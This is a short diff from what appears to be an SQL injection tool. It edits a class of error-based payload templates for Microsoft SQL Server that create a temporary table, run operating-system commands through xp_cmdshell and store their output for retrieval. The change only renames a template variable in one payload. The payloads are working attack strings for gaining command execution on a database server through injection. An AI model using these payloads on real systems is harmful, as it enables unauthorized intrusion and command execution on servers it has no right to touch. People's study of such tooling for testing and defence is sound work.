@@ -47,7 +47,7 @@ class error_based():
 #Create temp table
     "create_tmp_tbl" : "create table xtmptable (num int identity,result varchar(8000) NULL,primary key(num))", 
 #Insert xp_cmdshell output to temp table
-    "insert_result" : "declare @cmd_hex varchar(8000) select @cmd_hex=${cmd_hex};insert xtmptable exec master..xp_cmdshell @cmd_hex", 
+    "insert_result" : "declare @cmd_hex varchar(8000) select @cmd_hex=${cmd};insert xtmptable exec master..xp_cmdshell @cmd_hex", 
 #Exec xp_cmdshell encoded
     "exec_cmdshell" : "declare @cmd_hex varchar(8000) select @cmd_hex=${cmd_hex};exec master..xp_cmdshell @cmd_hex", 
 #Get count of rows from temp table
